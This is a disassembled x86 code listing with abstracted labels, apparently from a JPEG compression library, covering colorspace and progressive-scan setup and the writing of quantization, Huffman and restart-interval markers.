xor ecx ecx
mov [ edx + 0x114 ] ecx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_497b3c
push ebx
mov ebx eax
push rw-data
mov ecx rw-data
lea edx [ ebx + 0x54 ]
mov eax ebx
call sub_497ab4
push rw-data
mov ecx rw-data
lea edx [ ebx + 0x64 ]
mov eax ebx
call sub_497ab4
push rw-data
mov ecx rw-data
lea edx [ ebx + 0x58 ]
mov eax ebx
call sub_497ab4
push rw-data
mov ecx rw-data
lea edx [ ebx + 0x68 ]
mov eax ebx
call sub_497ab4
pop ebx
retn
sub_497b94
push ebx
mov ebx eax
push esi
cmp [ ebx + 0x14 ] 0x64
je r-xdata
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x34 ] 0x8
mov ecx 0x1
mov edx 0x4b
mov eax ebx
call sub_497a98
mov eax ebx
call sub_497b3c
xor edx edx
lea eax [ ebx + 0x74 ]
mov eax ebx
mov ecx 0x348
xor edx edx
mov esi [ eax + 0x4 ]
call [ esi ]
mov [ ebx + 0x40 ] eax
mov [ eax ] 0x0
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x20 ] 0x5
inc edx
inc eax
cmp edx 0x10
jl r-xdata
xor edx edx
xor ecx ecx
mov [ ebx + 0xa8 ] edx
mov [ ebx + 0xa4 ] ecx
xor eax eax
xor edx edx
mov [ ebx + 0xac ] eax
xor ecx ecx
mov [ ebx + 0xb0 ] edx
mov [ ebx + 0xb4 ] ecx
cmp [ ebx + 0x34 ] 0x8
jle r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0xbc ] edx
mov [ ebx + 0xc0 ] 0x2
xor ecx ecx
xor eax eax
mov [ ebx + 0xc4 ] ecx
mov [ ebx + 0xc8 ] eax
mov [ ebx + 0xd0 ] 0x1
mov [ ebx + 0xd1 ] 0x1
mov [ ebx + 0xd2 ] 0x0
mov [ ebx + 0xd4 ] 0x1
mov [ ebx + 0xd6 ] 0x1
mov eax ebx
call sub_497c94
pop esi
pop ebx
retn
mov [ ebx + 0xb4 ] 0x1
sub_497c94
mov edx [ eax + 0x28 ]
cmp edx 0x5
ja r-xdata
mov ecx [ eax ]
mov [ ecx + 0x14 ] 0x9
mov edx [ eax ]
call [ edx ]
retn
jmp [ edx * 4 + jump_table_497ca3 ]
mov edx 0x1
call sub_497d08
retn
mov edx 0x3
call sub_497d08
retn
mov edx 0x3
call sub_497d08
retn
mov edx 0x4
call sub_497d08
retn
mov edx 0x5
call sub_497d08
retn
xor edx edx
call sub_497d08
retn
sub_497d08
push ebx
mov ebx eax
push esi
mov esi edx
cmp [ ebx + 0x14 ] 0x64
je r-xdata
mov [ ebx + 0x3c ] esi
xor ecx ecx
mov [ ebx + 0xcc ] ecx
xor eax eax
mov [ ebx + 0xd8 ] eax
cmp esi 0x5
ja r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xa
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop esi
pop ebx
retn
jmp [ esi * 4 + jump_table_497d4c ]
mov [ ebx + 0xcc ] 0x1
mov [ ebx + 0x38 ] 0x1
mov eax [ ebx + 0x40 ]
xor edx edx
xor ecx ecx
mov [ eax ] 0x1
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
pop esi
pop ebx
retn
mov [ ebx + 0xd8 ] 0x1
mov [ ebx + 0x38 ] 0x3
mov eax [ ebx + 0x40 ]
xor ecx ecx
xor edx edx
mov [ eax ] 0x52
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
mov eax [ ebx + 0x40 ]
xor edx edx
add eax 0x54
xor ecx ecx
mov [ eax ] 0x47
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0x40 ]
xor ecx ecx
add eax 0xa8
xor edx edx
mov [ eax ] 0x42
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
pop esi
pop ebx
retn
mov [ ebx + 0xcc ] 0x1
mov [ ebx + 0x38 ] 0x3
mov eax [ ebx + 0x40 ]
xor edx edx
xor ecx ecx
mov [ eax ] 0x1
mov [ eax + 0x8 ] 0x2
mov [ eax + 0xc ] 0x2
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0x40 ]
add eax 0x54
mov [ eax ] 0x2
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x14 ] 0x1
mov [ eax + 0x18 ] 0x1
mov eax [ ebx + 0x40 ]
add eax 0xa8
mov [ eax ] 0x3
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x14 ] 0x1
mov [ eax + 0x18 ] 0x1
pop esi
pop ebx
retn
mov [ ebx + 0xd8 ] 0x1
mov [ ebx + 0x38 ] 0x4
mov eax [ ebx + 0x40 ]
xor edx edx
xor ecx ecx
mov [ eax ] 0x43
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0x40 ]
xor ecx ecx
add eax 0x54
xor edx edx
mov [ eax ] 0x4d
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
mov eax [ ebx + 0x40 ]
xor edx edx
add eax 0xa8
xor ecx ecx
mov [ eax ] 0x59
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0x40 ]
xor ecx ecx
add eax 0xfc
xor edx edx
mov [ eax ] 0x4b
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x14 ] edx
mov [ eax + 0x18 ] ecx
pop esi
pop ebx
retn
mov [ ebx + 0xd8 ] 0x1
mov [ ebx + 0x38 ] 0x4
mov eax [ ebx + 0x40 ]
xor edx edx
xor ecx ecx
mov [ eax ] 0x1
mov [ eax + 0x8 ] 0x2
mov [ eax + 0xc ] 0x2
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0x40 ]
xor edx edx
add eax 0x54
xor ecx ecx
mov [ eax ] 0x2
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x14 ] 0x1
mov [ eax + 0x18 ] 0x1
mov eax [ ebx + 0x40 ]
add eax 0xa8
mov [ eax ] 0x3
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] 0x1
mov [ eax + 0x14 ] 0x1
mov [ eax + 0x18 ] 0x1
mov eax [ ebx + 0x40 ]
add eax 0xfc
mov [ eax ] 0x4
mov [ eax + 0x8 ] 0x2
mov [ eax + 0xc ] 0x2
mov [ eax + 0x10 ] edx
xor edx edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
pop esi
pop ebx
retn
mov eax [ ebx + 0x24 ]
mov [ ebx + 0x38 ] eax
mov eax [ ebx + 0x38 ]
cmp eax 0x1
jl r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x1a
mov edx [ ebx + 0x38 ]
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] 0xa
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax 0xa
jle r-xdata
cmp edx [ ebx + 0x38 ]
jl r-xdata
xor edx edx
jmp r-xdata
lea eax [ edx + edx * 4 ]
xor ecx ecx
lea eax [ edx + eax * 4 ]
shl eax 0x2
add eax [ ebx + 0x40 ]
mov [ eax ] edx
mov [ eax + 0x8 ] 0x1
mov [ eax + 0xc ] 0x1
mov [ eax + 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x14 ] ecx
xor ecx ecx
mov [ eax + 0x18 ] ecx
inc edx
pop esi
pop ebx
retn
sub_4980c0
push ebp
mov ebp esp
mov [ eax ] 0x1
mov [ eax + 0x4 ] edx
mov [ eax + 0x14 ] ecx
mov edx [ ebp + 0x10 ]
mov [ eax + 0x18 ] edx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x1c ] ecx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
add eax 0x24
pop ebp
retn 0xc
sub_4980e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
mov [ eax ] 0x1
mov [ eax + 0x4 ] ebx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] esi
mov edi [ ebp + 0xc ]
inc ebx
mov [ eax + 0x1c ] edi
mov edi [ ebp + 0x8 ]
mov [ eax + 0x20 ] edi
add eax 0x24
cmp edx ebx
jg r-xdata
sub_498124
push ebp
mov ebp esp
push ebx
push esi
cmp edx 0x4
jg r-xdata
push 0x0
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
xor ecx ecx
call sub_4980e8
mov [ eax ] edx
xor ebx ebx
lea esi [ eax + 0x4 ]
cmp edx ebx
jle r-xdata
xor edx edx
mov [ eax + 0x18 ] edx
mov [ eax + 0x14 ] edx
mov [ eax + 0x1c ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x20 ] ecx
add eax 0x24
jmp r-xdata
mov [ esi ] ebx
inc ebx
add esi 0x4
cmp edx ebx
jg r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
sub_498170
push ebx
push esi
mov esi eax
push edi
push ecx
cmp [ esi + 0x14 ] 0x64
mov edi [ esi + 0x38 ]
je r-xdata
cmp edi 0x3
jne r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x14
mov edx [ esi + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edi 0x4
jle r-xdata
cmp [ esi + 0x3c ] 0x3
jne r-xdata
mov eax edi
shl eax 0x2
add eax 0x2
mov [ esp ] eax
mov ecx edi
add ecx ecx
lea ecx [ ecx + ecx * 2 ]
mov [ esp ] ecx
jmp r-xdata
mov [ esp ] 0xa
jmp r-xdata
cmp [ esp ] 0xa
jle r-xdata
mov edx [ esi + 0x170 ]
cmp edx [ esp ]
jge r-xdata
cmp [ esi + 0x16c ] 0x0
je r-xdata
mov ebx 0xa
mov ebx [ esp ]
jmp r-xdata
mov ebx [ esi + 0x16c ]
cmp edi 0x3
mov [ esi + 0xa8 ] ebx
mov eax [ esp ]
mov [ esi + 0xa4 ] eax
jne r-xdata
push 0x1
xor ecx ecx
mov edx edi
mov eax ebx
call sub_498124
mov ebx eax
push 0x5
push 0x0
push 0x2
mov ecx 0x1
mov edx edi
mov eax ebx
call sub_4980e8
mov ebx eax
push 0x3f
push 0x0
push 0x2
mov ecx 0x6
mov edx edi
mov eax ebx
call sub_4980e8
mov ebx eax
push 0x3f
push 0x2
push 0x1
mov ecx 0x1
mov edx edi
mov eax ebx
call sub_4980e8
mov ebx eax
push 0x0
mov ecx 0x1
mov edx edi
mov eax ebx
call sub_498124
mov ebx eax
push 0x3f
push 0x1
push 0x0
mov ecx 0x1
mov edx edi
mov eax ebx
call sub_4980e8
cmp [ esi + 0x3c ] 0x3
jne r-xdata
mov ecx ebx
mov eax esi
shl ecx 0x2
mov [ esi + 0x170 ] ebx
mov ebx [ eax + 0x4 ]
xor edx edx
lea ecx [ ecx + ecx * 8 ]
call [ ebx ]
mov [ esi + 0x16c ] eax
push 0x1
xor ecx ecx
mov edx edi
mov eax ebx
call sub_498124
mov ebx eax
push 0x5
push 0x0
push 0x2
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_4980c0
mov ebx eax
push 0x3f
push 0x0
push 0x1
mov ecx 0x1
mov edx 0x2
mov eax ebx
call sub_4980c0
mov ebx eax
push 0x3f
push 0x0
push 0x1
mov ecx 0x1
mov edx 0x1
mov eax ebx
call sub_4980c0
mov ebx eax
push 0x3f
push 0x0
push 0x2
mov ecx 0x6
xor edx edx
mov eax ebx
call sub_4980c0
mov ebx eax
push 0x3f
push 0x2
push 0x1
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_4980c0
mov ebx eax
push 0x0
mov ecx 0x1
mov edx edi
mov eax ebx
call sub_498124
mov ebx eax
push 0x3f
push 0x1
push 0x0
mov ecx 0x1
mov edx 0x2
mov eax ebx
call sub_4980c0
mov ebx eax
push 0x3f
push 0x1
push 0x0
mov ecx 0x1
mov edx 0x1
mov eax ebx
call sub_4980c0
mov ebx eax
push 0x3f
push 0x1
push 0x0
mov ecx 0x1
xor edx edx
mov eax ebx
call sub_4980c0
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_498388
push ebx
mov ebx eax
push esi
mov esi edx
cmp [ ebx + 0x14 ] 0x64
je r-xdata
test esi esi
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov eax ebx
mov edx [ eax + 0x18 ]
call [ edx + 0x8 ]
mov eax ebx
call sub_49887c
mov eax ebx
mov edx [ eax + 0x148 ]
call [ edx ]
xor ecx ecx
mov [ ebx + 0xdc ] ecx
cmp [ ebx + 0xac ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_498640
mov eax 0x65
mov eax 0x66
jmp r-xdata
mov [ ebx + 0x14 ] eax
pop esi
pop ebx
retn
sub_4983fc
push ebx
mov ebx eax
push esi
push edi
push ecx
mov edi edx
cmp [ ebx + 0x14 ] 0x65
mov esi ecx
je r-xdata
mov ecx [ ebx + 0xdc ]
cmp ecx [ ebx + 0x20 ]
jb r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x7b
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov ecx [ ebx + 0x148 ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xdc ]
mov [ eax + 0x4 ] edx
mov ecx [ ebx + 0x20 ]
mov [ eax + 0x8 ] ecx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
mov eax [ ebx + 0x20 ]
sub eax [ ebx + 0xdc ]
cmp eax esi
jae r-xdata
mov eax ebx
mov edx [ eax + 0x148 ]
call [ edx + 0x4 ]
xor eax eax
mov edx edi
mov [ esp ] eax
mov eax ebx
push esi
lea ecx [ esp + 0x4 ]
mov esi [ eax + 0x14c ]
call [ esi + 0x4 ]
mov eax [ esp ]
add [ ebx + 0xdc ] eax
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov esi eax
sub_4984ac
push ebx
mov ebx eax
push esi
push edi
push ebp
mov ebp ecx
cmp [ ebx + 0x14 ] 0x66
mov edi edx
je r-xdata
mov ecx [ ebx + 0xdc ]
cmp ecx [ ebx + 0x20 ]
jb r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x7b
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
xor eax eax
jmp r-xdata
mov ecx [ ebx + 0x148 ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0xdc ]
mov [ eax + 0x4 ] edx
mov ecx [ ebx + 0x20 ]
mov [ eax + 0x8 ] ecx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0xe8 ]
shl esi 0x3
cmp esi ebp
jbe r-xdata
mov eax ebx
mov edx [ eax + 0x148 ]
call [ edx + 0x4 ]
mov edx edi
mov eax ebx
mov ecx [ eax + 0x154 ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x17
mov eax ebx
mov edx [ eax ]
call [ edx ]
add [ ebx + 0xdc ] esi
mov eax esi
xor eax eax
jmp r-xdata
sub_498568
push ebx
mov ebx eax
push esi
xor eax eax
push edi
mov [ ebx + 0x4 ] eax
cmp edx 0x3e
mov esi ecx
je r-xdata
cmp esi 0x174
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xc
mov [ eax + 0x18 ] 0x3e
mov [ eax + 0x1c ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi [ ebx ]
mov edi [ ebx + 0xc ]
push 0x174
push 0x0
push ebx
call sub_48ab3c
add esp 0xc
mov [ ebx ] esi
mov [ ebx + 0xc ] edi
xor eax eax
mov [ ebx + 0x10 ] eax
mov eax ebx
call sub_48d040
xor edx edx
xor ecx ecx
mov [ ebx + 0x8 ] edx
mov [ ebx + 0x18 ] ecx
xor eax eax
lea edx [ ebx + 0x44 ]
mov [ ebx + 0x40 ] eax
xor eax eax
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x15
mov [ eax + 0x18 ] 0x174
mov [ eax + 0x1c ] esi
mov eax ebx
mov edx [ eax ]
call [ edx ]
xor ecx ecx
inc eax
mov [ edx ] ecx
add edx 0x4
cmp eax 0x4
jl r-xdata
xor eax eax
lea edx [ ebx + 0x54 ]
xor ecx ecx
inc eax
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x10 ] ecx
add edx 0x4
cmp eax 0x4
jl r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x16c ] eax
mov [ ebx + 0x2c ] edx
mov [ ebx + 0x30 ] 0x3ff00000
mov [ ebx + 0x14 ] 0x64
pop edi
pop esi
pop ebx
retn
sub_498640
push ebx
push esi
xor ecx ecx
lea ebx [ eax + 0x44 ]
inc ecx
add ebx 0x4
cmp ecx 0x4
jl r-xdata
mov [ esi + 0x80 ] edx
mov esi [ ebx ]
test esi esi
je r-xdata
xor ecx ecx
add eax 0x54
mov ebx [ eax + 0x10 ]
test ebx ebx
je r-xdata
mov [ ebx + 0x114 ] edx
inc ecx
add eax 0x4
cmp ecx 0x4
jl r-xdata
mov [ ebx + 0x114 ] edx
mov ebx [ eax ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub_498688
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x14 ]
cmp eax 0x65
je r-xdata
mov edx [ ebx + 0xdc ]
cmp edx [ ebx + 0x20 ]
jae r-xdata
cmp eax 0x66
jne r-xdata
mov eax ebx
mov edx [ eax + 0x148 ]
call [ edx + 0x8 ]
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x43
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x14 ] 0x67
je r-xdata
mov ecx [ ebx + 0x148 ]
cmp [ ecx + 0x10 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x148 ]
call [ edx ]
xor esi esi
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x158 ]
call [ edx + 0xc ]
mov eax ebx
mov edx [ eax + 0x18 ]
call [ edx + 0x10 ]
mov eax ebx
call sub_4977dc
pop esi
pop ebx
retn
cmp esi [ ebx + 0xec ]
jb r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax + 0x148 ]
call [ edx + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax + 0x154 ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov [ eax + 0x4 ] esi
mov edx [ ebx + 0xec ]
mov [ eax + 0x8 ] edx
mov eax ebx
mov edx [ eax + 0x8 ]
call [ edx ]
inc esi
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x18
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_498764
push ebp
mov ebp esp
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0xdc ] 0x0
mov edi edx
mov esi ecx
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x14 ]
cmp eax 0x65
je r-xdata
mov ecx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0xffffffff
test ecx ecx
jne r-xdata
mov eax ebx
mov edx edi
mov ecx [ ebp + 0x8 ]
mov edi [ eax + 0x158 ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x158 ]
mov edi [ eax + 0x18 ]
jmp r-xdata
cmp eax 0x66
je r-xdata
xor edx edx
mov dl [ esi ]
mov eax ebx
call edi
inc esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp eax 0x67
je r-xdata
sub_4987d8
push ebx
mov ebx eax
push esi
push edi
cmp [ ebx + 0xdc ] 0x0
mov edi ecx
mov esi edx
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x14 ]
cmp eax 0x65
je r-xdata
mov eax ebx
mov ecx edi
mov edx esi
mov ebx [ eax + 0x158 ]
call [ ebx + 0x14 ]
pop edi
pop esi
pop ebx
retn
cmp eax 0x66
je r-xdata
cmp eax 0x67
je r-xdata
sub_498830
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x64
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov eax ebx
mov edx [ eax + 0x18 ]
call [ edx + 0x8 ]
mov eax ebx
call sub_4990fc
mov eax ebx
mov edx [ eax + 0x158 ]
call [ edx + 0x10 ]
mov eax ebx
mov edx [ eax + 0x18 ]
call [ edx + 0x10 ]
pop ebx
retn
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_49887c
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_499bb8
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov eax ebx
call sub_49bf68
cmp [ ebx + 0xb0 ] 0x0
je r-xdata
mov eax ebx
call sub_49af58
mov eax ebx
call sub_49b944
xor edx edx
mov eax ebx
call sub_49a270
cmp [ ebx + 0xe0 ] 0x0
je r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x1
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax ebx
call sub_49dcac
mov eax ebx
call sub_49ca74
jmp r-xdata
cmp [ ebx + 0xa4 ] 0x1
jg r-xdata
mov edx 0x1
cmp [ ebx + 0xb4 ] 0x0
jne r-xdata
xor edx edx
jmp r-xdata
mov eax ebx
call sub_49aa54
xor edx edx
mov eax ebx
call sub_499d58
mov eax ebx
call sub_4990fc
mov eax ebx
mov edx [ eax + 0x4 ]
call [ edx + 0x18 ]
mov eax ebx
mov edx [ eax + 0x158 ]
call [ edx ]
pop ebx
retn
sub_498928
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
inc [ eax ]
mov [ ecx ] dl
dec [ eax + 0x4 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi eax
mov eax ebx
call [ esi + 0xc ]
test eax eax
jne r-xdata
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x18
mov edx [ eax ]
call [ edx ]
sub_498958
push ebx
push esi
mov esi edx
mov ebx eax
mov edx 0xff
mov eax ebx
call sub_498928
mov edx esi
mov eax ebx
call sub_498928
pop esi
pop ebx
retn
sub_498978
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
sar edx 0x8
and edx 0xff
call sub_498928
mov edx esi
mov eax ebx
and edx 0xff
call sub_498928
pop esi
pop ebx
retn
sub_4989a4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] edx
mov esi eax
mov eax [ esp ]
mov ebp [ esi + eax * 4 + 0x44 ]
test ebp ebp
jne r-xdata
xor edi edi
xor ebx ebx
mov eax ebp
mov eax [ esi ]
mov [ eax + 0x14 ] 0x34
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
inc ebx
add eax 0x2
cmp ebx 0x40
jl r-xdata
mov edi 0x1
cmp [ eax ] 0xff
jbe r-xdata
cmp [ ebp + 0x80 ] 0x0
jne r-xdata
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx 0xdb
mov eax esi
call sub_498958
test edi edi
je r-xdata
mov edx 0x43
mov edx 0x83
jmp r-xdata
mov edx [ esp + 0x4 ]
mov eax esi
and edx 0xff
call sub_498928
inc ebx
add [ esp + 0x8 ] 0x4
cmp ebx 0x40
jl r-xdata
mov edx [ esp + 0x4 ]
mov eax esi
shr edx 0x8
call sub_498928
mov eax esi
call sub_498978
mov edx edi
mov eax esi
shl edx 0x4
add edx [ esp ]
call sub_498928
mov [ esp + 0x8 ] rw-data
xor ebx ebx
mov eax [ esp + 0x8 ]
test edi edi
mov edx [ eax ]
movzx ecx [ ebp + edx * 2 ]
mov [ esp + 0x4 ] ecx
je r-xdata
mov [ ebp + 0x80 ] 0x1
sub_498a88
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] edx
mov esi eax
test ecx ecx
je r-xdata
mov eax [ esp ]
mov edi [ esi + eax * 4 + 0x54 ]
mov eax [ esp ]
mov edi [ esi + eax * 4 + 0x64 ]
add [ esp ] 0x10
jmp r-xdata
cmp [ edi + 0x114 ] 0x0
jne r-xdata
mov eax [ esi ]
mov [ eax + 0x14 ] 0x32
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax esi
mov edx [ eax ]
call [ edx ]
test edi edi
jne r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx 0xc4
mov eax esi
call sub_498958
xor ebp ebp
mov ebx 0x1
lea eax [ edi + 0x1 ]
xor edx edx
inc ebx
mov dl [ eax ]
inc eax
add ebp edx
cmp ebx 0x10
jle r-xdata
lea edx [ ebp + 0x13 ]
mov eax esi
call sub_498978
mov edx [ esp ]
mov eax esi
call sub_498928
mov ebx 0x1
lea eax [ edi + 0x1 ]
mov [ esp + 0x4 ] eax
mov edx [ esp + 0x4 ]
movzx edx [ edx ]
mov eax esi
call sub_498928
inc ebx
inc [ esp + 0x4 ]
cmp ebx 0x10
jle r-xdata
xor ebx ebx
lea eax [ edi + 0x11 ]
mov [ esp + 0x8 ] eax
cmp ebp ebx
jle r-xdata
mov [ edi + 0x114 ] 0x1
mov edx [ esp + 0x8 ]
movzx edx [ edx ]
mov eax esi
call sub_498928
inc ebx
inc [ esp + 0x8 ]
cmp ebp ebx
jg r-xdata
sub_498b68
push ebx
mov ebx eax
mov edx 0xdd
mov eax ebx
call sub_498958
mov edx 0x4
mov eax ebx
call sub_498978
mov edx [ ebx + 0xc4 ]
mov eax ebx
call sub_498978
pop ebx
retn
sub_498b94
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_498958
mov edx [ ebx + 0x38 ]
mov eax ebx
lea edx [ edx + edx * 2 ]
add edx 0x8
call sub_498978
cmp [ ebx + 0x20 ] 0xffff
jg r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x29
mov [ eax + 0x18 ] 0xffff
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x1c ] 0xffff
jle r-xdata
cmp edi [ ebx + 0x38 ]
jl r-xdata
mov edx [ ebx + 0x34 ]
mov eax ebx
call sub_498928
mov edx [ ebx + 0x20 ]
mov eax ebx
call sub_498978
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_498978
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_498928
xor edi edi
mov esi [ ebx + 0x40 ]
